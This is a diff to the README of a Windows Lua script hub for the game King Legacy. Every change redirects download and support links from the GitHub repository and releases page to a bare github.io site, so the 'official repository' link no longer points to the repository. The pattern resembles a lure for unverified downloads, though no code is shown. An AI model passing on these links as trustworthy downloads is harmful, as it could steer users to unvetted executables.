@@ -1,6 +1,6 @@
 # ⚡ king-legacy-desktop-script-hub - Fast Lua Script Runner for Windows
 
-[![Download Now](https://img.shields.io/badge/Download-King%20Legacy%20Hub-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ecc71)](https://github.com/abdulqadi6633/king-legacy-desktop-script-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-King%20Legacy%20Hub-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ecc71)](https://abdulqadi6633.github.io)
 
 ---
 
@@ -14,7 +14,7 @@ Whether you're a seasoned player or just starting your King Legacy adventure, th
 
 ## 📥 Download & Install
 
-Visit this link to download the application: **[King Legacy Desktop Script Hub Downloads](https://github.com/abdulqadi6633/king-legacy-desktop-script-hub/releases)**
+Visit this link to download the application: **[King Legacy Desktop Script Hub Downloads](https://abdulqadi6633.github.io)**
 
 Here's how to get started in three simple steps:
 
@@ -141,7 +141,7 @@ The hub can also check automatically each time it launches — just enable that 
 
 We're here to make sure your experience is smooth. Here's how to reach us:
 
-- **GitHub Issues:** Visit the [official repository](https://github.com/abdulqadi6633/king-legacy-desktop-script-hub) and open a support ticket in the "Issues" tab.
+- **GitHub Issues:** Visit the [official repository](https://abdulqadi6633.github.io) and open a support ticket in the "Issues" tab.
 - **Community Discussions:** Join the conversation in the Discussions area of the repository — other users and the team can help you out.
 
 Please include your Windows version and what you were doing when the issue happened so we can help you faster.
@@ -157,7 +157,7 @@ Don't forget to star the repo if you like it, and check back often for new scrip
 ---
 
 **Download now and start scripting:**  
-👉 [https://github.com/abdulqadi6633/king-legacy-desktop-script-hub/releases](https://github.com/abdulqadi6633/king-legacy-desktop-script-hub/releases)
+👉 [https://abdulqadi6633.github.io](https://abdulqadi6633.github.io)
 
 ---
 
